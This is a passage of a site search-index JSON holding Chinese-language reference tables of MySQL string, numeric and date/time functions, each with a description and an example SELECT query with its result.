\u8f93\u51fa 250,500.56 INSERT(s1,x,len,s2) \u5b57\u7b26\u4e32 s2 \u66ff\u6362 s1 \u7684 x \u4f4d\u7f6e\u5f00\u59cb\u957f\u5ea6\u4e3a len \u7684\u5b57\u7b26\u4e32 \u4ece\u5b57\u7b26\u4e32\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u7684 6 \u4e2a\u5b57\u7b26\u66ff\u6362\u4e3a runoob\uff1a SELECT INSERT(\"google.com\", 1, 6, \"runoob\"); -- \u8f93\u51fa\uff1arunoob.com LOCATE(s1,s) \u4ece\u5b57\u7b26\u4e32 s \u4e2d\u83b7\u53d6 s1 \u7684\u5f00\u59cb\u4f4d\u7f6e \u83b7\u53d6 b \u5728\u5b57\u7b26\u4e32 abc \u4e2d\u7684\u4f4d\u7f6e\uff1a SELECT LOCATE('st','myteststring'); -- 5 \u8fd4\u56de\u5b57\u7b26\u4e32 abc \u4e2d b \u7684\u4f4d\u7f6e\uff1a SELECT LOCATE('b', 'abc') -- 2 LCASE(s) \u5c06\u5b57\u7b26\u4e32 s \u7684\u6240\u6709\u5b57\u6bcd\u53d8\u6210\u5c0f\u5199\u5b57\u6bcd \u5b57\u7b26\u4e32 RUNOOB \u8f6c\u6362\u4e3a\u5c0f\u5199\uff1a SELECT LCASE('RUNOOB') -- runoob LEFT(s,n) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u524d n \u4e2a\u5b57\u7b26 \u8fd4\u56de\u5b57\u7b26\u4e32 runoob \u4e2d\u7684\u524d\u4e24\u4e2a\u5b57\u7b26\uff1a SELECT LEFT('runoob',2) -- ru LOWER(s) \u5c06\u5b57\u7b26\u4e32 s \u7684\u6240\u6709\u5b57\u6bcd\u53d8\u6210\u5c0f\u5199\u5b57\u6bcd \u5b57\u7b26\u4e32 RUNOOB \u8f6c\u6362\u4e3a\u5c0f\u5199\uff1a SELECT LOWER('RUNOOB') -- runoob LPAD(s1,len,s2) \u5728\u5b57\u7b26\u4e32 s1 \u7684\u5f00\u59cb\u5904\u586b\u5145\u5b57\u7b26\u4e32 s2\uff0c\u4f7f\u5b57\u7b26\u4e32\u957f\u5ea6\u8fbe\u5230 len \u5c06\u5b57\u7b26\u4e32 xx \u586b\u5145\u5230 abc \u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u5904\uff1a SELECT LPAD('abc',5,'xx') -- xxabc LTRIM(s) \u53bb\u6389\u5b57\u7b26\u4e32 s \u5f00\u59cb\u5904\u7684\u7a7a\u683c \u53bb\u6389\u5b57\u7b26\u4e32 RUNOOB\u5f00\u59cb\u5904\u7684\u7a7a\u683c\uff1a SELECT LTRIM(\" RUNOOB\") AS LeftTrimmedString;-- RUNOOB MID(s,n,len) \u4ece\u5b57\u7b26\u4e32 s \u7684 n \u4f4d\u7f6e\u622a\u53d6\u957f\u5ea6\u4e3a len \u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u540c SUBSTRING(s,n,len) \u4ece\u5b57\u7b26\u4e32 RUNOOB \u4e2d\u7684\u7b2c 2 \u4e2a\u4f4d\u7f6e\u622a\u53d6 3\u4e2a \u5b57\u7b26\uff1a SELECT MID(\"RUNOOB\", 2, 3) AS ExtractString; -- UNO POSITION(s1 IN s) \u4ece\u5b57\u7b26\u4e32 s \u4e2d\u83b7\u53d6 s1 \u7684\u5f00\u59cb\u4f4d\u7f6e \u8fd4\u56de\u5b57\u7b26\u4e32 abc \u4e2d b \u7684\u4f4d\u7f6e\uff1a SELECT POSITION('b' in 'abc') -- 2 REPEAT(s,n) \u5c06\u5b57\u7b26\u4e32 s \u91cd\u590d n \u6b21 \u5c06\u5b57\u7b26\u4e32 runoob \u91cd\u590d\u4e09\u6b21\uff1a SELECT REPEAT('runoob',3) -- runoobrunoobrunoob REPLACE(s,s1,s2) \u5c06\u5b57\u7b26\u4e32 s2 \u66ff\u4ee3\u5b57\u7b26\u4e32 s \u4e2d\u7684\u5b57\u7b26\u4e32 s1 \u5c06\u5b57\u7b26\u4e32 abc \u4e2d\u7684\u5b57\u7b26 a \u66ff\u6362\u4e3a\u5b57\u7b26 x\uff1a SELECT REPLACE('abc','a','x') --xbc REVERSE(s) \u5c06\u5b57\u7b26\u4e32s\u7684\u987a\u5e8f\u53cd\u8fc7\u6765 \u5c06\u5b57\u7b26\u4e32 abc \u7684\u987a\u5e8f\u53cd\u8fc7\u6765\uff1a SELECT REVERSE('abc') -- cba RIGHT(s,n) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u540e n \u4e2a\u5b57\u7b26 \u8fd4\u56de\u5b57\u7b26\u4e32 runoob \u7684\u540e\u4e24\u4e2a\u5b57\u7b26\uff1a SELECT RIGHT('runoob',2) -- ob RPAD(s1,len,s2) \u5728\u5b57\u7b26\u4e32 s1 \u7684\u7ed3\u5c3e\u5904\u6dfb\u52a0\u5b57\u7b26\u4e32 s2\uff0c\u4f7f\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u8fbe\u5230 len \u5c06\u5b57\u7b26\u4e32 xx \u586b\u5145\u5230 abc \u5b57\u7b26\u4e32\u7684\u7ed3\u5c3e\u5904\uff1a SELECT RPAD('abc',5,'xx') -- abcxx RTRIM(s) \u53bb\u6389\u5b57\u7b26\u4e32 s \u7ed3\u5c3e\u5904\u7684\u7a7a\u683c \u53bb\u6389\u5b57\u7b26\u4e32 RUNOOB \u7684\u672b\u5c3e\u7a7a\u683c\uff1a SELECT RTRIM(\"RUNOOB \") AS RightTrimmedString; -- RUNOOB SPACE(n) \u8fd4\u56de n \u4e2a\u7a7a\u683c \u8fd4\u56de 10 \u4e2a\u7a7a\u683c\uff1a SELECT SPACE(10); STRCMP(s1,s2) \u6bd4\u8f83\u5b57\u7b26\u4e32 s1 \u548c s2\uff0c\u5982\u679c s1 \u4e0e s2 \u76f8\u7b49\u8fd4\u56de 0 \uff0c\u5982\u679c s1>s2 \u8fd4\u56de 1\uff0c\u5982\u679c s1<s2 \u8fd4\u56de -1 \u6bd4\u8f83\u5b57\u7b26\u4e32\uff1a SELECT STRCMP(\"runoob\", \"runoob\"); -- 0 SUBSTR(s, start, length) \u4ece\u5b57\u7b26\u4e32 s \u7684 start \u4f4d\u7f6e\u622a\u53d6\u957f\u5ea6\u4e3a length \u7684\u5b50\u5b57\u7b26\u4e32 \u4ece\u5b57\u7b26\u4e32 RUNOOB \u4e2d\u7684\u7b2c 2 \u4e2a\u4f4d\u7f6e\u622a\u53d6 3\u4e2a \u5b57\u7b26\uff1a SELECT SUBSTR(\"RUNOOB\", 2, 3) AS ExtractString; -- UNO SUBSTRING(s, start, length) \u4ece\u5b57\u7b26\u4e32 s \u7684 start \u4f4d\u7f6e\u622a\u53d6\u957f\u5ea6\u4e3a length \u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e SUBSTR(s, start, length) \u4ece\u5b57\u7b26\u4e32 RUNOOB \u4e2d\u7684\u7b2c 2 \u4e2a\u4f4d\u7f6e\u622a\u53d6 3\u4e2a \u5b57\u7b26\uff1a SELECT SUBSTRING(\"RUNOOB\", 2, 3) AS ExtractString; -- UNO SUBSTRING_INDEX(s, delimiter, number) \u8fd4\u56de\u4ece\u5b57\u7b26\u4e32 s \u7684\u7b2c number \u4e2a\u51fa\u73b0\u7684\u5206\u9694\u7b26 delimiter \u4e4b\u540e\u7684\u5b50\u4e32\u3002 \u5982\u679c number \u662f\u6b63\u6570\uff0c\u8fd4\u56de\u7b2c number \u4e2a\u5b57\u7b26\u5de6\u8fb9\u7684\u5b57\u7b26\u4e32\u3002 \u5982\u679c number \u662f\u8d1f\u6570\uff0c\u8fd4\u56de\u7b2c(number \u7684\u7edd\u5bf9\u503c(\u4ece\u53f3\u8fb9\u6570))\u4e2a\u5b57\u7b26\u53f3\u8fb9\u7684\u5b57\u7b26\u4e32\u3002 SELECT SUBSTRING_INDEX('a*b','*',1) -- a SELECT SUBSTRING_INDEX('a*b','*',-1) -- b SELECT SUBSTRING_INDEX(SUBSTRING_INDEX('a*b*c*d*e','*',3),'*',-1) -- c TRIM(s) \u53bb\u6389\u5b57\u7b26\u4e32 s \u5f00\u59cb\u548c\u7ed3\u5c3e\u5904\u7684\u7a7a\u683c \u53bb\u6389\u5b57\u7b26\u4e32 RUNOOB \u7684\u9996\u5c3e\u7a7a\u683c\uff1a SELECT TRIM(' RUNOOB ') AS TrimmedString; UCASE(s) \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5927\u5199 \u5c06\u5b57\u7b26\u4e32 runoob \u8f6c\u6362\u4e3a\u5927\u5199\uff1a SELECT UCASE(\"runoob\"); -- RUNOOB UPPER(s) \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5927\u5199 \u5c06\u5b57\u7b26\u4e32 runoob \u8f6c\u6362\u4e3a\u5927\u5199\uff1a SELECT UPPER(\"runoob\"); -- RUNOOB","title":"MySQL \u5b57\u7b26\u4e32\u51fd\u6570"},{"location":"database/mysql/function/#mysql_1","text":"\u51fd\u6570\u540d \u63cf\u8ff0 \u5b9e\u4f8b ABS(x) \u8fd4\u56de x \u7684\u7edd\u5bf9\u503c \u8fd4\u56de -1 \u7684\u7edd\u5bf9\u503c\uff1a SELECT ABS(-1) -- \u8fd4\u56de1 ACOS(x) \u6c42 x \u7684\u53cd\u4f59\u5f26\u503c\uff08\u5355\u4f4d\u4e3a\u5f27\u5ea6\uff09\uff0cx \u4e3a\u4e00\u4e2a\u6570\u503c SELECT ACOS(0.25); ASIN(x) \u6c42\u53cd\u6b63\u5f26\u503c\uff08\u5355\u4f4d\u4e3a\u5f27\u5ea6\uff09\uff0cx \u4e3a\u4e00\u4e2a\u6570\u503c SELECT ASIN(0.25); ATAN(x) \u6c42\u53cd\u6b63\u5207\u503c\uff08\u5355\u4f4d\u4e3a\u5f27\u5ea6\uff09\uff0cx \u4e3a\u4e00\u4e2a\u6570\u503c SELECT ATAN(2.5); ATAN2(n, m) \u6c42\u53cd\u6b63\u5207\u503c\uff08\u5355\u4f4d\u4e3a\u5f27\u5ea6\uff09 SELECT ATAN2(-0.8, 2); AVG(expression) \u8fd4\u56de\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u5e73\u5747\u503c\uff0cexpression \u662f\u4e00\u4e2a\u5b57\u6bb5 \u8fd4\u56de Products \u8868\u4e2dPrice \u5b57\u6bb5\u7684\u5e73\u5747\u503c\uff1a SELECT AVG(Price) AS AveragePrice FROM Products; CEIL(x) \u8fd4\u56de\u5927\u4e8e\u6216\u7b49\u4e8e x \u7684\u6700\u5c0f\u6574\u6570 SELECT CEIL(1.5) -- \u8fd4\u56de2 CEILING(x) \u8fd4\u56de\u5927\u4e8e\u6216\u7b49\u4e8e x \u7684\u6700\u5c0f\u6574\u6570 SELECT CEILING(1.5); -- \u8fd4\u56de2 COS(x) \u6c42\u4f59\u5f26\u503c(\u53c2\u6570\u662f\u5f27\u5ea6) SELECT COS(2); COT(x) \u6c42\u4f59\u5207\u503c(\u53c2\u6570\u662f\u5f27\u5ea6) SELECT COT(6); COUNT(expression) \u8fd4\u56de\u67e5\u8be2\u7684\u8bb0\u5f55\u603b\u6570\uff0cexpression \u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u6bb5\u6216\u8005 * \u53f7 \u8fd4\u56de Products \u8868\u4e2d products \u5b57\u6bb5\u603b\u5171\u6709\u591a\u5c11\u6761\u8bb0\u5f55\uff1a SELECT COUNT(ProductID) AS NumberOfProducts FROM Products; DEGREES(x) \u5c06\u5f27\u5ea6\u8f6c\u6362\u4e3a\u89d2\u5ea6 SELECT DEGREES(3.1415926535898) -- 180 n DIV m \u6574\u9664\uff0cn \u4e3a\u88ab\u9664\u6570\uff0cm \u4e3a\u9664\u6570 \u8ba1\u7b97 10 \u9664\u4e8e 5\uff1a SELECT 10 DIV 5; -- 2 EXP(x) \u8fd4\u56de e \u7684 x \u6b21\u65b9 \u8ba1\u7b97 e \u7684\u4e09\u6b21\u65b9\uff1a SELECT EXP(3) -- 20.085536923188 FLOOR(x) \u8fd4\u56de\u5c0f\u4e8e\u6216\u7b49\u4e8e x \u7684\u6700\u5927\u6574\u6570 \u5c0f\u4e8e\u6216\u7b49\u4e8e 1.5 \u7684\u6574\u6570\uff1a SELECT FLOOR(1.5) -- \u8fd4\u56de1 GREATEST(expr1, expr2, expr3, ...) \u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c \u8fd4\u56de\u4ee5\u4e0b\u6570\u5b57\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c\uff1a SELECT GREATEST(3, 12, 34, 8, 25); -- 34 \u8fd4\u56de\u4ee5\u4e0b\u5b57\u7b26\u4e32\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c\uff1a SELECT GREATEST(\"Google\", \"Runoob\", \"Apple\"); -- Runoob LEAST(expr1, expr2, expr3, ...) \u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c \u8fd4\u56de\u4ee5\u4e0b\u6570\u5b57\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c\uff1a SELECT LEAST(3, 12, 34, 8, 25); -- 3 \u8fd4\u56de\u4ee5\u4e0b\u5b57\u7b26\u4e32\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c\uff1a SELECT LEAST(\"Google\", \"Runoob\", \"Apple\"); -- Apple LN \u8fd4\u56de\u6570\u5b57\u7684\u81ea\u7136\u5bf9\u6570\uff0c\u4ee5 e \u4e3a\u5e95\u3002 \u8fd4\u56de 2 \u7684\u81ea\u7136\u5bf9\u6570\uff1a SELECT LN(2); -- 0.6931471805599453 LOG(x) \u6216 LOG(base, x) \u8fd4\u56de\u81ea\u7136\u5bf9\u6570(\u4ee5 e \u4e3a\u5e95\u7684\u5bf9\u6570)\uff0c\u5982\u679c\u5e26\u6709 base \u53c2\u6570\uff0c\u5219 base \u4e3a\u6307\u5b9a\u5e26\u5e95\u6570\u3002 SELECT LOG(20.085536923188) -- 3 SELECT LOG(2, 4); -- 2 LOG10(x) \u8fd4\u56de\u4ee5 10 \u4e3a\u5e95\u7684\u5bf9\u6570 SELECT LOG10(100) -- 2 LOG2(x) \u8fd4\u56de\u4ee5 2 \u4e3a\u5e95\u7684\u5bf9\u6570 \u8fd4\u56de\u4ee5 2 \u4e3a\u5e95 6 \u7684\u5bf9\u6570\uff1a SELECT LOG2(6); -- 2.584962500721156 MAX(expression) \u8fd4\u56de\u5b57\u6bb5 expression \u4e2d\u7684\u6700\u5927\u503c \u8fd4\u56de\u6570\u636e\u8868 Products \u4e2d\u5b57\u6bb5 Price \u7684\u6700\u5927\u503c\uff1a SELECT MAX(Price) AS LargestPrice FROM Products; MIN(expression) \u8fd4\u56de\u5b57\u6bb5 expression \u4e2d\u7684\u6700\u5c0f\u503c \u8fd4\u56de\u6570\u636e\u8868 Products \u4e2d\u5b57\u6bb5 Price \u7684\u6700\u5c0f\u503c\uff1a SELECT MIN(Price) AS MinPrice FROM Products; MOD(x,y) \u8fd4\u56de x \u9664\u4ee5 y \u4ee5\u540e\u7684\u4f59\u6570 5 \u9664\u4e8e 2 \u7684\u4f59\u6570\uff1a SELECT MOD(5,2) -- 1 PI() \u8fd4\u56de\u5706\u5468\u7387(3.141593\uff09 SELECT PI() --3.141593 POW(x,y) \u8fd4\u56de x \u7684 y \u6b21\u65b9 2 \u7684 3 \u6b21\u65b9\uff1a SELECT POW(2,3) -- 8 POWER(x,y) \u8fd4\u56de x \u7684 y \u6b21\u65b9 2 \u7684 3 \u6b21\u65b9\uff1a SELECT POWER(2,3) -- 8 RADIANS(x) \u5c06\u89d2\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6 180 \u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\uff1a SELECT RADIANS(180) -- 3.1415926535898 RAND() \u8fd4\u56de 0 \u5230 1 \u7684\u968f\u673a\u6570 SELECT RAND() --0.93099315644334 ROUND(x) \u8fd4\u56de\u79bb x \u6700\u8fd1\u7684\u6574\u6570 SELECT ROUND(1.23456) --1 SIGN(x) \u8fd4\u56de x \u7684\u7b26\u53f7\uff0cx \u662f\u8d1f\u6570\u30010\u3001\u6b63\u6570\u5206\u522b\u8fd4\u56de -1\u30010 \u548c 1 SELECT SIGN(-10) -- (-1) SIN(x) \u6c42\u6b63\u5f26\u503c(\u53c2\u6570\u662f\u5f27\u5ea6) SELECT SIN(RADIANS(30)) -- 0.5 SQRT(x) \u8fd4\u56dex\u7684\u5e73\u65b9\u6839 25 \u7684\u5e73\u65b9\u6839\uff1a SELECT SQRT(25) -- 5 SUM(expression) \u8fd4\u56de\u6307\u5b9a\u5b57\u6bb5\u7684\u603b\u548c \u8ba1\u7b97 OrderDetails \u8868\u4e2d\u5b57\u6bb5 Quantity \u7684\u603b\u548c\uff1a SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails; TAN(x) \u6c42\u6b63\u5207\u503c(\u53c2\u6570\u662f\u5f27\u5ea6) SELECT TAN(1.75); -- -5.52037992250933 TRUNCATE(x,y) \u8fd4\u56de\u6570\u503c x \u4fdd\u7559\u5230\u5c0f\u6570\u70b9\u540e y \u4f4d\u7684\u503c\uff08\u4e0e ROUND \u6700\u5927\u7684\u533a\u522b\u662f\u4e0d\u4f1a\u8fdb\u884c\u56db\u820d\u4e94\u5165\uff09 SELECT TRUNCATE(1.23456,3) -- 1.234","title":"MySQL \u6570\u5b57\u51fd\u6570"},{"location":"database/mysql/function/#mysql_2","text":"\u51fd\u6570\u540d \u63cf\u8ff0 \u5b9e\u4f8b ADDDATE(d,n) \u8ba1\u7b97\u8d77\u59cb\u65e5\u671f d \u52a0\u4e0a n \u5929\u7684\u65e5\u671f SELECT ADDDATE(\"2017-06-15\", INTERVAL 10 DAY); ->2017-06-25 ADDTIME(t,n) n \u662f\u4e00\u4e2a\u65f6\u95f4\u8868\u8fbe\u5f0f\uff0c\u65f6\u95f4 t \u52a0\u4e0a\u65f6\u95f4\u8868\u8fbe\u5f0f n \u52a0 5 \u79d2\uff1a SELECT ADDTIME('2011-11-11 11:11:11', 5); ->2011-11-11 11:11:16 (\u79d2) \u6dfb\u52a0 2 \u5c0f\u65f6, 10 \u5206\u949f, 5 \u79d2: SELECT ADDTIME(\"2020-06-15 09:34:21\", \"2:10:5\"); -> 2020-06-15 11:44:26 CURDATE() \u8fd4\u56de\u5f53\u524d\u65e5\u671f SELECT CURDATE(); -> 2018-09-19 CURRENT_DATE() \u8fd4\u56de\u5f53\u524d\u65e5\u671f SELECT CURRENT_DATE(); -> 2018-09-19 CURRENT_TIME \u8fd4\u56de\u5f53\u524d\u65f6\u95f4 SELECT CURRENT_TIME(); -> 19:59:02 CURRENT_TIMESTAMP() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT CURRENT_TIMESTAMP() -> 2018-09-19 20:57:43 CURTIME() \u8fd4\u56de\u5f53\u524d\u65f6\u95f4 SELECT CURTIME(); -> 19:59:02 DATE() \u4ece\u65e5\u671f\u6216\u65e5\u671f\u65f6\u95f4\u8868\u8fbe\u5f0f\u4e2d\u63d0\u53d6\u65e5\u671f\u503c SELECT DATE(\"2017-06-15\"); -> 2017-06-15 DATEDIFF(d1,d2) \u8ba1\u7b97\u65e5\u671f d1->d2 \u4e4b\u95f4\u76f8\u9694\u7684\u5929\u6570 SELECT DATEDIFF('2001-01-01','2001-02-02') -> -32 DATE_ADD(d\uff0cINTERVAL expr type) \u8ba1\u7b97\u8d77\u59cb\u65e5\u671f d \u52a0\u4e0a\u4e00\u4e2a\u65f6\u95f4\u6bb5\u540e\u7684\u65e5\u671f\uff0ctype \u503c\u53ef\u4ee5\u662f\uff1aMICROSECONDSECONDMINUTEHOURDAYWEEKMONTHQUARTERYEARSECOND_MICROSECONDMINUTE_MICROSECONDMINUTE_SECONDHOUR_MICROSECONDHOUR_SECONDHOUR_MINUTEDAY_MICROSECONDDAY_SECONDDAY_MINUTEDAY_HOURYEAR_MONTH SELECT DATE_ADD(\"2017-06-15\", INTERVAL 10 DAY); -> 2017-06-25 SELECT DATE_ADD(\"2017-06-15 09:34:21\", INTERVAL 15 MINUTE); -> 2017-06-15 09:49:21 SELECT DATE_ADD(\"2017-06-15 09:34:21\", INTERVAL -3 HOUR); ->2017-06-15 06:34:21 SELECT DATE_ADD(\"2017-06-15 09:34:21\", INTERVAL -3 MONTH); ->2017-04-15 DATE_FORMAT(d,f) \u6309\u8868\u8fbe\u5f0f f\u7684\u8981\u6c42\u663e\u793a\u65e5\u671f d SELECT DATE_FORMAT('2011-11-11 11:11:11','%Y-%m-%d %r') -> 2011-11-11 11:11:11 AM DATE_SUB(date,INTERVAL expr type) \u51fd\u6570\u4ece\u65e5\u671f\u51cf\u53bb\u6307\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u3002 Orders \u8868\u4e2d OrderDate \u5b57\u6bb5\u51cf\u53bb 2 \u5929\uff1a SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders DAY(d) \u8fd4\u56de\u65e5\u671f\u503c d \u7684\u65e5\u671f\u90e8\u5206 SELECT DAY(\"2017-06-15\"); -> 15 DAYNAME(d) \u8fd4\u56de\u65e5\u671f d \u662f\u661f\u671f\u51e0\uff0c\u5982 Monday,Tuesday SELECT DAYNAME('2011-11-11 11:11:11') ->Friday DAYOFMONTH(d) \u8ba1\u7b97\u65e5\u671f d \u662f\u672c\u6708\u7684\u7b2c\u51e0\u5929 SELECT DAYOFMONTH('2011-11-11 11:11:11') ->11 DAYOFWEEK(d) \u65e5\u671f d \u4eca\u5929\u662f\u661f\u671f\u51e0\uff0c1 \u661f\u671f\u65e5\uff0c2 \u661f\u671f\u4e00\uff0c\u4ee5\u6b64\u7c7b\u63a8 SELECT DAYOFWEEK('2011-11-11 11:11:11') ->6 DAYOFYEAR(d) \u8ba1\u7b97\u65e5\u671f d \u662f\u672c\u5e74\u7684\u7b2c\u51e0\u5929 SELECT DAYOFYEAR('2011-11-11 11:11:11') ->315 EXTRACT(type FROM d) \u4ece\u65e5\u671f d \u4e2d\u83b7\u53d6\u6307\u5b9a\u7684\u503c\uff0ctype \u6307\u5b9a\u8fd4\u56de\u7684\u503c\u3002 type\u53ef\u53d6\u503c\u4e3a\uff1a MICROSECONDSECONDMINUTEHOURDAYWEEKMONTHQUARTERYEARSECOND_MICROSECONDMINUTE_MICROSECONDMINUTE_SECONDHOUR_MICROSECONDHOUR_SECONDHOUR_MINUTEDAY_MICROSECONDDAY_SECONDDAY_MINUTEDAY_HOURYEAR_MONTH SELECT EXTRACT(MINUTE FROM '2011-11-11 11:11:11') -> 11 FROM_DAYS(n) \u8ba1\u7b97\u4ece 0000 \u5e74 1 \u6708 1 \u65e5\u5f00\u59cb n \u5929\u540e\u7684\u65e5\u671f SELECT FROM_DAYS(1111) -> 0003-01-16 HOUR(t) \u8fd4\u56de t \u4e2d\u7684\u5c0f\u65f6\u503c SELECT HOUR('1:2:3') -> 1 LAST_DAY(d) \u8fd4\u56de\u7ed9\u7ed9\u5b9a\u65e5\u671f\u7684\u90a3\u4e00\u6708\u4efd\u7684\u6700\u540e\u4e00\u5929 SELECT LAST_DAY(\"2017-06-20\"); -> 2017-06-30 LOCALTIME() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT LOCALTIME() -> 2018-09-19 20:57:43 LOCALTIMESTAMP() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT LOCALTIMESTAMP() -> 2018-09-19 20:57:43 MAKEDATE(year, day-of-year) \u57fa\u4e8e\u7ed9\u5b9a\u53c2\u6570\u5e74\u4efd year \u548c\u6240\u5728\u5e74\u4e2d\u7684\u5929\u6570\u5e8f\u53f7 day-of-year \u8fd4\u56de\u4e00\u4e2a\u65e5\u671f SELECT MAKEDATE(2017, 3); -> 2017-01-03 MAKETIME(hour, minute, second) \u7ec4\u5408\u65f6\u95f4\uff0c\u53c2\u6570\u5206\u522b\u4e3a\u5c0f\u65f6\u3001\u5206\u949f\u3001\u79d2 SELECT MAKETIME(11, 35, 4); -> 11:35:04 MICROSECOND(date) \u8fd4\u56de\u65e5\u671f\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u5fae\u79d2\u6570 SELECT MICROSECOND(\"2017-06-20 09:34:00.000023\"); -> 23 MINUTE(t) \u8fd4\u56de t \u4e2d\u7684\u5206\u949f\u503c SELECT MINUTE('1:2:3') -> 2 MONTHNAME(d) \u8fd4\u56de\u65e5\u671f\u5f53\u4e2d\u7684\u6708\u4efd\u540d\u79f0\uff0c\u5982 November SELECT MONTHNAME('2011-11-11 11:11:11') -> November MONTH(d) \u8fd4\u56de\u65e5\u671fd\u4e2d\u7684\u6708\u4efd\u503c\uff0c1 \u5230 12 SELECT MONTH('2011-11-11 11:11:11') ->11 NOW() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT NOW() -> 2018-09-19 20:57:43 PERIOD_ADD(period, number) \u4e3a \u5e74-\u6708 \u7ec4\u5408\u65e5\u671f\u6dfb\u52a0\u4e00\u4e2a\u65f6\u6bb5 SELECT PERIOD_ADD(201703, 5); -> 201708 PERIOD_DIFF(period1, period2) \u8fd4\u56de\u4e24\u4e2a\u65f6\u6bb5\u4e4b\u95f4\u7684\u6708\u4efd\u5dee\u503c SELECT PERIOD_DIFF(201710, 201703); -> 7 QUARTER(d) \u8fd4\u56de\u65e5\u671fd\u662f\u7b2c\u51e0\u5b63\u8282\uff0c\u8fd4\u56de 1 \u5230 4 SELECT QUARTER('2011-11-11 11:11:11') -> 4 SECOND(t) \u8fd4\u56de t \u4e2d\u7684\u79d2\u949f\u503c SELECT SECOND('1:2:3') -> 3 SEC_TO_TIME(s) \u5c06\u4ee5\u79d2\u4e3a\u5355\u4f4d\u7684\u65f6\u95f4 s \u8f6c\u6362\u4e3a\u65f6\u5206\u79d2\u7684\u683c\u5f0f SELECT SEC_TO_TIME(4320) -> 01:12:00 STR_TO_DATE(string, format_mask) \u5c06\u5b57\u7b26\u4e32\u8f6c\u53d8\u4e3a\u65e5\u671f SELECT STR_TO_DATE(\"August 10 2017\", \"%M %d %Y\"); -> 2017-08-10 SUBDATE(d,n) \u65e5\u671f d \u51cf\u53bb n \u5929\u540e\u7684\u65e5\u671f SELECT SUBDATE('2011-11-11 11:11:11', 1) ->2011-11-10 11:11:11 (\u9ed8\u8ba4\u662f\u5929) SUBTIME(t,n) \u65f6\u95f4 t \u51cf\u53bb n \u79d2\u7684\u65f6\u95f4 SELECT SUBTIME('2011-11-11 11:11:11', 5) ->2011-11-11 11:11:06 (\u79d2) SYSDATE() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT SYSDATE() -> 2018-09-19 20:57:43 TIME(expression) \u63d0\u53d6\u4f20\u5165\u8868\u8fbe\u5f0f\u7684\u65f6\u95f4\u90e8\u5206 SELECT TIME(\"19:30:10\"); -> 19:30:10 TIME_FORMAT(t,f) \u6309\u8868\u8fbe\u5f0f f \u7684\u8981\u6c42\u663e\u793a\u65f6\u95f4 t SELECT TIME_FORMAT('11:11:11','%r') 11:11:11 AM TIME_TO_SEC(t) \u5c06\u65f6\u95f4 t \u8f6c\u6362\u4e3a\u79d2 SELECT TIME_TO_SEC('1:12:00') -> 4320 TIMEDIFF(time1, time2) \u8ba1\u7b97\u65f6\u95f4\u5dee\u503c mysql> SELECT TIMEDIFF(\"13:10:11\", \"13:10:10\"); -> 00:00:01 mysql> SELECT TIMEDIFF('2000:01:01 00:00:00', -> '2000:01:01 00:00:00.000001'); -> '-00:00:00.000001' mysql> SELECT TIMEDIFF('2008-12-31 23:59:59.000001', -> '2008-12-30 01:01:01.000002'); -> '46:58:57.999999' TIMESTAMP(expression, interval) \u5355\u4e2a\u53c2\u6570\u65f6\uff0c\u51fd\u6570\u8fd4\u56de\u65e5\u671f\u6216\u65e5\u671f\u65f6\u95f4\u8868\u8fbe\u5f0f\uff1b\u67092\u4e2a\u53c2\u6570\u65f6\uff0c\u5c06\u53c2\u6570\u52a0\u548c mysql> SELECT TIMESTAMP(\"2017-07-23\", \"13:10:11\"); -> 2017-07-23 13:10:11 mysql> SELECT TIMESTAMP('2003-12-31'); -> '2003-12-31 00:00:00' mysql> SELECT TIMESTAMP('2003-12-31 12:00:00','12:00:00'); -> '2004-01-01 00:00:00' TIMESTAMPDIFF(unit,datetime_expr1,datetime_expr2) \u8ba1\u7b97\u65f6\u95f4\u5dee\uff0c\u8fd4\u56de datetime_expr2 \u2212 datetime_expr1 \u7684\u65f6\u95f4\u5dee mysql> SELECT TIMESTAMPDIFF(DAY,'2003-02-01','2003-05-01'); // \u8ba1\u7b97\u4e24\u4e2a\u65f6\u95f4\u76f8\u9694\u591a\u5c11\u5929 -> 89 mysql> SELECT TIMESTAMPDIFF(MONTH,'2003-02-01','2003-05-01'); // \u8ba1\u7b97\u4e24\u4e2a\u65f6\u95f4\u76f8\u9694\u591a\u5c11\u6708 -> 3 mysql> SELECT TIMESTAMPDIFF(YEAR,'2002-05-01','2001-01-01'); // \u8ba1\u7b97\u4e24\u4e2a\u65f6\u95f4\u76f8\u9694\u591a\u5c11\u5e74 -> -1 mysql> SELECT TIMESTAMPDIFF(MINUTE,'2003-02-01','2003-05-01 12:05:55'); // \u8ba1\u7b97\u4e24\u4e2a\u65f6\u95f4\u76f8\u9694\u591a\u5c11\u5206\u949f -> 128885 TO_DAYS(d) \u8ba1\u7b97\u65e5\u671f d \u8ddd\u79bb 0000 \u5e74 1 \u6708 1 